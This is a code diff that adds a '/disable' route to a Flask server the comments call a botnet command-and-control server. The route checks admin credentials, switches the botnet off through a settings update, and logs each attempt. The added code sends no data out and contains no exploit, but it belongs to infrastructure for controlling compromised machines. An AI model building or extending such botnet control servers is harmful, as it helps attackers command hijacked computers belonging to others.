@@ -77,6 +77,30 @@ def getLog():
 
 
 
+# ROUTING SERVER - disable the botnet via C&C
+@app.route('/disable', methods=['POST'])
+def disableBotnet():
+    # retrieving username and password 
+    if CC.authenticate({ 'auth_usr'  : request.form['user'], 'admin_pwd' : request.form['password'] }): 
+        # if user is correctly authenticated we can performe update op.
+        try:
+            CC.updateSettings({}, enable=False)
+            app.logger.info("[{0}] => reached by {1} / {2}: botnet disabled!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+            return "Botnet disabled!", 200
+        except KeyError as error:
+            # if settings is missing as a param... update cannot be carried on
+            app.logger.info("[{0}] => reached by {1} / {2}: botnet disable, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+            return "Bad request, botnet disable", 400
+
+    else:
+        # if user was not authenticated properly, we log the event and return a forbidden status
+        app.logger.info("[{0}] => reached by {1} / {2}: disable operation forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.form['user']))
+        return "Forbidden!", 403
+
+
+# ---------------------------------------------------------------------#
+#                      SERVER START UP ROUTINE                         #
+# ---------------------------------------------------------------------#
 if __name__ == "__main__": 
     # adding log handler provided by werkzeug lib ... 
     handler = RotatingFileHandler(logPath, maxBytes=10000, backupCount=1)
